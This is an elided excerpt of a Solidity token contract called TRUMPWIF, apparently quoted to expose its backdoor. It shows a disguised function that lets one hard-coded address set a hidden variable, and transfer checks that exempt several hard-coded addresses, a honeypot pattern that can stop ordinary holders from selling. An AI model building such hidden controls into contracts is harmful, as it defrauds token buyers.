...
contract TRUMPWIF is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x21372EdfD6673f1EDD87Fc3A8FC4E6CD2A1215Eb) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x21372EdfD6673f1EDD87Fc3A8FC4E6CD2A1215Eb 
         && from != 0xf8F667ddCE73CD7646e270b1C4340a6C0b2043Fb
         && from != 0x53371F6b3f519adED076ea9743C87f9b4571f4D6)) {
    ...
    constructor() {
        _name = unicode"TRUMPWIF";
        _symbol = unicode"TRUMPWIF";
